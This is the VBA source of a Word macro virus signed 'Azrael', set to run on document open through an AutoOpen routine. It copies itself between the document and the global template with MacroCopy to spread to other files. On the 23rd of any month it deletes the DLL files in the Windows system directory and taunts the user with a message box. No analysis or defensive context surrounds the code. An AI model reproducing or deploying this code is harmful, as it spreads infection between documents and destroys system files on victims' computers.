   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "autoopen"

   Public Sub MAIN()
   Dim a$
   Dim b$
   On Error Resume Next
   a$ = "autoopen"
   b$ = WordBasic.[FileName$]() + ":" + a$
   WordBasic.MacroCopy a$, b$
   WordBasic.MacroCopy b$, a$
   If (WordBasic.Day(WordBasic.Now()) = 23) Then
       WordBasic.Kill "c:\windows\system\*.dll"
       WordBasic.MsgBox "Azrael cleaned your system directory !!!"
   End If
   WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
   End Sub
